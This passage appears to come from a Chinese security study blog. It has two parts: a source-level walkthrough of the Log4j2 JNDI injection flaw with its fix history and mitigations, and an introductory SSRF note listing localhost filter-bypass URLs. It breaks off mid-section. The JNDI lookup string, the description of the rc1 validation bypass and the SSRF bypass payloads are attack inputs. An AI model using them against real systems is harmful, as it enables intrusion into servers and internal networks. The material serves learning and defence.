<p>第 <strong>44</strong> 行 <strong>endMatchLen</strong> 使用
<strong>suffixMatcher</strong> 匹配到 <strong>}</strong>。</p>
<p>然后 <strong>50</strong> 行提取头尾中间的值赋给
<strong>varNameExpr</strong>，<strong>59</strong> 行赋值给
<strong>varName</strong>。</p>
<p>最后在 <strong>90</strong> 行调用 <strong>resolveVariable</strong>
方法解析。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StrSubstitutor (org.apache.logging.log4j.core.lookup)</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">substitute</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="type">int</span> offset, <span class="keyword">final</span> <span class="type">int</span> length,</span></span><br><span class="line"><span class="params">                       List&lt;String&gt; priorVariables)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">prefixMatcher</span> <span class="operator">=</span> getVariablePrefixMatcher(); <span class="comment">// prefixMatcher： &quot;org.apache.logging.log4j.core.lookup.StrMatcher$StringMatcher@694abbdc [$, &#123;]&quot;</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">suffixMatcher</span> <span class="operator">=</span> getVariableSuffixMatcher(); <span class="comment">// suffixMatcher: &quot;org.apache.logging.log4j.core.lookup.StrMatcher$StringMatcher@2e005c4b [&#125;]&quot;</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">char</span> <span class="variable">escape</span> <span class="operator">=</span> getEscapeChar();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">valueDelimiterMatcher</span> <span class="operator">=</span> getValueDelimiterMatcher(); <span class="comment">// valueDelimiterMatcher: &quot;org.apache.logging.log4j.core.lookup.StrMatcher$StringMatcher@4567f35d [:, -]&quot;</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">substitutionInVariablesEnabled</span> <span class="operator">=</span> isEnableSubstitutionInVariables();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">top</span> <span class="operator">=</span> priorVariables == <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">altered</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">lengthChange</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>[] chars = getChars(buf);</span><br><span class="line">    <span class="type">int</span> <span class="variable">bufEnd</span> <span class="operator">=</span> offset + length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> offset;</span><br><span class="line">    <span class="keyword">while</span> (pos &lt; bufEnd) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">startMatchLen</span> <span class="operator">=</span> prefixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br><span class="line">        <span class="keyword">if</span> (startMatchLen == <span class="number">0</span>) &#123;</span><br><span class="line">            pos++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// found variable start marker</span></span><br><span class="line">            <span class="keyword">if</span> (pos &gt; offset &amp;&amp; chars[pos - <span class="number">1</span>] == escape) &#123;</span><br><span class="line">                <span class="comment">// escaped</span></span><br><span class="line">                buf.deleteCharAt(pos - <span class="number">1</span>);</span><br><span class="line">                chars = getChars(buf);</span><br><span class="line">                lengthChange--;</span><br><span class="line">                altered = <span class="literal">true</span>;</span><br><span class="line">                bufEnd--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// find suffix</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">int</span> <span class="variable">startPos</span> <span class="operator">=</span> pos;</span><br><span class="line">                pos += startMatchLen;</span><br><span class="line">                <span class="type">int</span> <span class="variable">endMatchLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">nestedVarCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (pos &lt; bufEnd) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (substitutionInVariablesEnabled</span><br><span class="line">                            &amp;&amp; (endMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd)) != <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// found a nested variable start</span></span><br><span class="line">                        nestedVarCount++;</span><br><span class="line">                        pos += endMatchLen;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    endMatchLen = suffixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br><span class="line">                    <span class="keyword">if</span> (endMatchLen == <span class="number">0</span>) &#123;</span><br><span class="line">                        pos++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// found variable end marker</span></span><br><span class="line">                        <span class="keyword">if</span> (nestedVarCount == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">varNameExpr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars, startPos + startMatchLen, pos - startPos - startMatchLen);</span><br><span class="line">                            <span class="keyword">if</span> (substitutionInVariablesEnabled) &#123;</span><br><span class="line">                                <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">bufName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(varNameExpr);</span><br><span class="line">                                substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">                                varNameExpr = bufName.toString();</span><br><span class="line">                            &#125;</span><br><span class="line">                            pos += endMatchLen;</span><br><span class="line">                            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">endPos</span> <span class="operator">=</span> pos;</span><br><span class="line"></span><br><span class="line">                            <span class="type">String</span> <span class="variable">varName</span> <span class="operator">=</span> varNameExpr;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">varDefaultValue</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (valueDelimiterMatcher != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">final</span> <span class="type">char</span> [] varNameExprChars = varNameExpr.toCharArray();</span><br><span class="line">                                <span class="type">int</span> <span class="variable">valueDelimiterMatchLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; varNameExprChars.length; i++) &#123;</span><br><span class="line">                                    <span class="comment">// if there&#x27;s any nested variable when nested variable substitution disabled, then stop resolving name and default value.</span></span><br><span class="line">                                    <span class="keyword">if</span> (!substitutionInVariablesEnabled</span><br><span class="line">                                            &amp;&amp; prefixMatcher.isMatch(varNameExprChars, i, i, varNameExprChars.length) != <span class="number">0</span>) &#123;</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != <span class="number">0</span>) &#123;</span><br><span class="line">                                        varName = varNameExpr.substring(<span class="number">0</span>, i);</span><br><span class="line">                                        varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// on the first call initialize priorVariables</span></span><br><span class="line">                            <span class="keyword">if</span> (priorVariables == <span class="literal">null</span>) &#123;</span><br><span class="line">                                priorVariables = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                                priorVariables.add(<span class="keyword">new</span> <span class="title class_">String</span>(chars, offset, length + lengthChange));</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// handle cyclic substitution</span></span><br><span class="line">                            checkCyclicSubstitution(varName, priorVariables);</span><br><span class="line">                            priorVariables.add(varName);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// resolve the variable</span></span><br><span class="line">                            <span class="type">String</span> <span class="variable">varValue</span> <span class="operator">=</span> resolveVariable(event, varName, buf, startPos, endPos);</span><br><span class="line">                            <span class="comment">// ...</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// ...</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3
id="strsubstitutorresolvevariable">StrSubstitutor#resolveVariable</h3>
<p><strong>StrSubstitutor#resolveVariable</strong> 中调用
<strong>Interpolator#lookup</strong> 功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StrSubstitutor (org.apache.logging.log4j.core.lookup)</span></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                 <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="interpolatorlookup">Interpolator#lookup</h3>
<p><strong>Interpolator#lookup</strong> 在第 <strong>7</strong> 行以
<strong>:</strong> 为标记取 <strong>prefix</strong>，对于
<strong>jndi:ldap://127.0.0.1:14514/test</strong> 来说，此处的
<strong>prefix</strong> 为 <strong>jndi</strong>，<strong>name</strong>
为 <strong>ldap://127.0.0.1:14514/test</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Interpolator (org.apache.logging.log4j.core.lookup)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">    <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> lookups.get(prefix);</span><br><span class="line">        <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">            ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> event == <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在第 <strong>11</strong> 行获取 <strong>StrLookup</strong>，在第
<strong>17</strong> 行调用 <strong>lookup</strong> 方法，得以调用
<strong>JndiLookup#lookup</strong>。</p>
<figure>
<img src="/images/Study-RCE-Log4j/image-20230710152804876.png"
alt="image-20230710152804876" />
<figcaption aria-hidden="true">image-20230710152804876</figcaption>
</figure>
<h3 id="jndilookuplookup">JndiLookup#lookup</h3>
<p><strong>JndiLookup#lookup</strong> 调用
<strong>JndiManager#lookup</strong>，最后到
<strong>context#lookup</strong> 完成 <strong>JNDI</strong> 注入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JndiLookup (org.apache.logging.log4j.core.lookup)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">jndiName</span> <span class="operator">=</span> convertJndiName(key);</span><br><span class="line">    <span class="keyword">try</span> (<span class="keyword">final</span> <span class="type">JndiManager</span> <span class="variable">jndiManager</span> <span class="operator">=</span> JndiManager.getDefaultManager()) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> jndiManager.lookup(jndiName);</span><br><span class="line">        <span class="keyword">return</span> value == <span class="literal">null</span> ? <span class="literal">null</span> : String.valueOf(value);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> NamingException e) &#123;</span><br><span class="line">        LOGGER.warn(LOOKUP, <span class="string">&quot;Error looking up JNDI resource [&#123;&#125;].&quot;</span>, jndiName, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="触发条件">触发条件</h2>
<p><strong>Log4j2</strong> 有日志优先级，每个优先级对应一个数值
<strong>intLevel</strong> 记录在 <strong>StandardLevel</strong>
这个枚举类型中，数值越小优先级越高。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StandardLevel (org.apache.logging.log4j.spi)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">StandardLevel</span> &#123;</span><br><span class="line"></span><br><span class="line">    OFF(<span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    FATAL(<span class="number">100</span>),</span><br><span class="line"></span><br><span class="line">    ERROR(<span class="number">200</span>),</span><br><span class="line"></span><br><span class="line">    WARN(<span class="number">300</span>),</span><br><span class="line"></span><br><span class="line">    INFO(<span class="number">400</span>),</span><br><span class="line"></span><br><span class="line">    DEBUG(<span class="number">500</span>),</span><br><span class="line"></span><br><span class="line">    TRACE(<span class="number">600</span>),</span><br><span class="line"></span><br><span class="line">    ALL(Integer.MAX_VALUE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从 <strong>log.error</strong> 开始看，进入
<strong>AbstractLogger#logIfEnabled</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractLogger (org.apache.logging.log4j.spi)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">error</span><span class="params">(<span class="keyword">final</span> String message)</span> &#123;</span><br><span class="line">    logIfEnabled(FQCN, Level.ERROR, <span class="literal">null</span>, message, (Throwable) <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>AbstractLogger#logIfEnabled</strong> 判断
<strong>isEnabled</strong>，才会进入 <strong>logMessage</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractLogger (org.apache.logging.log4j.spi)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> Throwable t)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isEnabled(level, marker, message, t)) &#123;</span><br><span class="line">        logMessage(fqcn, level, marker, message, t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Logger#isEnabled</strong> 调用日志过滤器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Logger (org.apache.logging.log4j.core)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabled</span><span class="params">(<span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message, <span class="keyword">final</span> Throwable t)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> privateConfig.filter(level, marker, message, t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Logger$PrivateConfig#filter</strong> 的第 <strong>10</strong>
行，比较了 <strong>intLevel</strong> 的值，默认是
<strong>200</strong>，小于等于才可以返回 <strong>True</strong>，即只有
<strong>FATAL</strong> 和 <strong>ERROR</strong> 可以触发漏洞。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Logger$PrivateConfig (org.apache.logging.log4j.core)</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">filter</span><span class="params">(<span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String msg, <span class="keyword">final</span> Throwable t)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> config.getFilter();</span><br><span class="line">    <span class="keyword">if</span> (filter != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> Filter.<span class="type">Result</span> <span class="variable">r</span> <span class="operator">=</span> filter.filter(logger, level, marker, (Object) msg, t);</span><br><span class="line">        <span class="keyword">if</span> (r != Filter.Result.NEUTRAL) &#123;</span><br><span class="line">            <span class="keyword">return</span> r == Filter.Result.ACCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> level != <span class="literal">null</span> &amp;&amp; intLevel &gt;= level.intLevel();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然可以修改默认的 <strong>level</strong>，这里在第
<strong>9</strong> 行处改为 <strong>info</strong>，即小于等于
<strong>400</strong> 即可触发。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- -Dlog4j.configurationFile=path/to/log4j2.xml --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="漏洞修复">漏洞修复</h1>
<h2 id="rc1">2.15.0-rc1</h2>
<p>在 <strong>2.15.0-rc1</strong> 的<a
href="https://github.com/apache/logging-log4j2/commit/001aaada7dab82c3c09cde5f8e14245dc9d8b454?diff=split">更新</a>中，移除了从
<strong>Properties</strong> 中获取 <strong>Lookup</strong>
配置的选项，并修改判断逻辑，默认不开启 <strong>Lookup</strong>
功能。</p>
<p>并在 <strong>MessagePatternConverter</strong> 类中创建了内部类
<strong>SimpleMessagePatternConverter、FormattedMessagePatternConverter、LookupMessagePatternConverter、RenderingPatternConverter</strong>，将一些扩展的功能进行模块化的处理，而只有在开启
<strong>Lookup</strong> 功能时才会使用
<strong>LookupMessagePatternConverter</strong> 来替换。</p>
<p>在默认情况下，将使用 <strong>SimpleMessagePatternConverter</strong>
进行消息的格式化处理，不会解析其中的 <strong>${}</strong> 关键字。</p>
<p><img
src="/images/Study-RCE-Log4j/github.com_apache_logging-log4j2_commit_001aaada7dab82c3c09cde5f8e14245dc9d8b454_diff=split.png" /></p>
<p>第二个<a
href="https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3?diff=split">关键位置</a>是
<strong>JndiManager#lookup</strong> 方法中添加了校验，使用了
<strong>JndiManagerFactory</strong> 来创建 <strong>JndiManager</strong>
实例，不再使用 <strong>InitialContext</strong>，而是使用子类
<strong>InitialDirContext</strong>，并为其添加白名单
<strong>JNDI</strong> 协议、白名单主机名、白名单类名。</p>
<p>并在关键的 <strong>Lookup</strong>
函数中加入了校验判断，但是由于校验逻辑有误，程序在
<strong>catch</strong> 住异常后没有
<strong>return</strong>，导致可以利用
<strong>URISyntaxException</strong> 异常来绕过校验，直接走到后面的
<strong>Lookup</strong>。例如在 URI 中插入空格，即可触发漏洞。</p>
<p><img
src="/images/Study-RCE-Log4j/github.com_apache_logging-log4j2_commit_c77b3cb39312b83b053d23a2158b99ac7de44dd3_diff=split.png" /></p>
<p>虽然此处绕过了校验，但由于默认 <strong>Lookup</strong>
配置为关闭，需要开启才能触发漏洞，所以危害较低。</p>
<h2 id="rc2">2.15.0-rc2</h2>
<p>在 <strong>rc1</strong> 更新被绕过后，官方发布了 <a
href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658"><strong>rc2</strong></a>，代码如下，可以看到是在
<strong>catch</strong> 里添加了 <strong>return</strong>，修复了
<strong>rc1</strong> 的绕过。</p>
<p><img
src="/images/Study-RCE-Log4j/github.com_apache_logging-log4j2_commit_bac0d8a35c7e354a0d3f706569116dff6c6bd658.png" /></p>
<h2 id="rc1-1">2.16.0-rc1</h2>
<p><a
href="https://github.com/apache/logging-log4j2/commit/27972043b76c9645476f561c5adc483dec6d3f5d">更新</a>，版本号
<strong>2.16-rc1</strong>，通过两个版本的对比可以看出，官方移除了
<strong>MessagePatternConverter</strong> 的内部实现类
<strong>LookupMessagePatternConverter</strong>，并删除了相关调用代码。</p>
<p><img
src="/images/Study-RCE-Log4j/github.com_apache_logging-log4j2_commit_27972043b76c9645476f561c5adc483dec6d3f5d.png" /></p>
<h1 id="生产环境修复">生产环境修复</h1>
<p>前两项在 <strong>2.10.2</strong> 以下无效。</p>
<ul>
<li><p>升级 <strong>Log4j</strong> 版本 到
<strong>2.15.0-rc2</strong></p></li>
<li><p>设置 <strong>JVM</strong>
参数：<strong>-Dlog4j2.formatMsgNoLookups=true</strong></p></li>
<li><p>设置系统环境变量：<strong>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true</strong></p></li>
<li><p>删除 <strong>JndiLookup</strong>：<strong>zip -q -d
log4j-core-*.jar
org/apache/logging/log4j/core/lookup/JndiLookup.class</strong>，重启服务</p></li>
<li><p><strong>JDK</strong> 升级到
<strong>11.0.1/8u191/7u201/6u211</strong>。</p></li>
<li><p>禁用 <strong>JNDI</strong>。</p></li>
</ul>
<h1 id="refer">REFER</h1>
<p><a href="https://tttang.com/archive/1378/">浅谈
<strong>Log4j2</strong> 漏洞</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Java</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>关于SSRF的初探</title>
    <url>/Study-SSRF/</url>
    <content><![CDATA[<h3 id="简介">简介</h3>
<p><strong>SSRF</strong>，即<strong>Server-Side Request
Forgery</strong>，中文名服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，<strong>SSRF</strong>攻击的目标是从外网无法访问的内部系统。</p>
<p>简单来说，就是利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。</p>
<span id="more"></span>
<p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。
攻击者可以利用<strong>SSRF</strong>实现的攻击主要有<strong>5</strong>种：</p>
<ul>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<strong>banner</strong>信息</li>
<li>攻击运行在内网或本地的应用程序【比如溢出</li>
<li>对内网<strong>WEB</strong>应用进行指纹识别，通过访问默认文件实现。</li>
<li>攻击内外网的<strong>WEB</strong>应用，主要是使用 GET
参数就可以实现的攻击【比如<strong>Struts2</strong>，<strong>Sqli</strong>等</li>
<li>利用<strong>file</strong>协议读取本地文件等。</li>
</ul>
<h3 id="利用场景">利用场景</h3>
<ul>
<li>探测内网信息</li>
<li>攻击内网或本地其他服务</li>
<li>穿透防火墙</li>
</ul>
<h3 id="出现场景">出现场景</h3>
<ul>
<li>能够对外发起网络请求的地方，就可能存在<strong>SSRF</strong>漏洞。</li>
<li>从远程服务器请求资源【<strong>Upload from URL，Import &amp; Export
RSS Feed</strong>。</li>
<li>数据库内置功能【<strong>Oracle、MongoDB、MSSQL、Postgres、CouchDB</strong>。</li>
<li><strong>Webmail</strong>收取其他邮箱邮件【<strong>POP3、IMAP、SMTP</strong>。</li>
<li>文件处理、编码处理、属性信息处理【<strong>ffmpeg、ImageMagic、DOCX、PDF、XML</strong>。</li>
</ul>
<h3 id="简单举例">简单举例</h3>
<ul>
<li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li>
<li>根据远程<strong>URL</strong>上传，静态资源图片等，这些会请求远程服务器的资源。</li>
<li>数据库的比如<strong>Mongodb</strong>的<strong>copyDatabase</strong>函数，这点看猪猪侠讲的吧，没实践过。</li>
<li>邮件系统就是接收邮件服务器地址这些地方。</li>
<li>文件就找<strong>ImageMagick</strong>，<strong>Xml</strong>这些。</li>
<li>从<strong>HTML</strong>代码关键字中寻找，比如：<strong>source、share、link、src、imageurl、target</strong>等。</li>
</ul>
<h3 id="原理">原理</h3>
<p>暂时挖坑，日后再补。</p>
<h3 id="绕过方法">绕过方法</h3>
<h4 id="攻击本地">攻击本地</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://localhost:22</span><br></pre></td></tr></table></figure>
<h4 id="利用">利用[::]</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用[::]充当localhost</span><br><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>
<h4 id="利用-1">利用@</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com@127.0.0.1</span><br></pre></td></tr></table></figure>
<h4 id="利用短地址">利用短地址</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>
<h4 id="利用特殊域名">利用特殊域名</h4>
<p>利用的原理是DNS解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1.xip.io/</span><br><span class="line">http://www.owasp.org.127.0.0.1.xip.io/</span><br></pre></td></tr></table></figure>
<h4 id="利用dns解析">利用DNS解析</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在域名设置记录指向127.0.0.1 http://ssrf.ur10ser.xyz/</span><br></pre></td></tr></table></figure>
<h4 id="利用上传">利用上传</h4>
